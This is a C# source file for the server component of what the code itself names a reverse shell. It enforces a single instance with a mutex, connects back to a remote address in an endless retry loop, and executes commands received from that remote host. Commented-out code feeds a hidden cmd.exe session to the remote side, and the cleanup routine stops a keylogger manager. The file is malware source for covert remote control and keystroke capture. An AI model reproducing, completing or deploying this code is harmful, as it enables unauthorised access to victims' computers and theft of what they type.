using Commands;
using NetworkManager;
using Shared;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;

namespace ReverseShellServer
{
    public class ServerManager
    {
        // Process processCmd { get; set; }


        public ServerManager()
        {
            // Only one instance can run, random string identifier
            var mutex = new Mutex(false, "ThisIsMyMutex-2JUY34DE8E23D7");
            if (!mutex.WaitOne(TimeSpan.Zero, true))
            {
                Environment.Exit(0);
            }
        }


        public void Start(string remoteAdress, int remotePort, int retryDelay)
        {
            while (true)
            {
                RunServer(remoteAdress, remotePort);
                Thread.Sleep(retryDelay);           //Wait for the given time and try again
            }
        }


        void RunServer(string remoteAdress, int remotePort)
        {
            if (!GlobalNetworkManager.ServerNetworkManager.ConnectToClient(remoteAdress, remotePort))
            {
                return;
            }

            /*processCmd = new Process
            {
                StartInfo =
                {
                    FileName = "cmd.exe",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    StandardOutputEncoding = Encoding.GetEncoding(850),
                    RedirectStandardOutput = true,
                    RedirectStandardInput = true,
                    RedirectStandardError = true
                },
            };
            processCmd.OutputDataReceived += CmdOutputDataHandler;
            processCmd.Start();
            processCmd.BeginOutputReadLine();

            SayHelloToCmd();*/

            while (true)
            {
                try
                {
                    ProcessCommand(GlobalNetworkManager.ReadLine());
                }
                catch (Exception)
                {
                    Cleanup();
                    break;
                }
            }
        }


        void ProcessCommand(string receivedData)
        {
            var splittedCommand = receivedData.Split(' ').ToList();
            var commandName = splittedCommand[0];
            var arguments = new List<string>();

            if (splittedCommand.Count > 1)
            {
                arguments = splittedCommand.GetRange(1, splittedCommand.Count - 1);
            }

            var command = CommandsManager.GetCommandByName(commandName);
            if (command != null)
            {
                try
                {
                    command.ServerMethod(arguments);
                }
                catch (StopServerException)
                {
                    StopServer();
                }
                //SayHelloToCmd();
            }/*
            else
            {
                processCmd.StandardInput.WriteLine($"{receivedData}\n");
            }*/
        }


        //void SayHelloToCmd() => processCmd.StandardInput.WriteLine("Hello !\n");


        /// <summary>
        /// Send output to client
        /// </summary>
        /// <param name="sendingProcess"></param>
        /// <param name="outLine"></param>
        /*void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            var output = outLine.Data;
            if (string.IsNullOrEmpty(outLine.Data)) return;

            try
            {
                // Check if the line is the one representing the path
                if (output.Substring(1, 2) == ":\\" && output.Contains(">"))
                {
                    // Represents path + > + command
                    if (output[output.Length - 1] != '>')
                    {
                        return;
                    }

                    // Change current working directory to the path and return
                    Directory.SetCurrentDirectory(output.Substring(0, output.Length - 1));
                }
                    
                GlobalNetworkManager.WriteLine(output);
            }
            catch (Exception)
            {
                // ignored
            }
        }*/


        void Cleanup()
        {
            try
            {
                //processCmd.Kill();
                MainWindow.keyLoggerManager.Stop();
                GlobalNetworkManager.ServerNetworkManager.Cleanup();
            }
            catch (Exception)
            {
                // ignored
            }
        }


        void StopServer()
        {
            Cleanup();
            Environment.Exit(0);
        }
    }
}
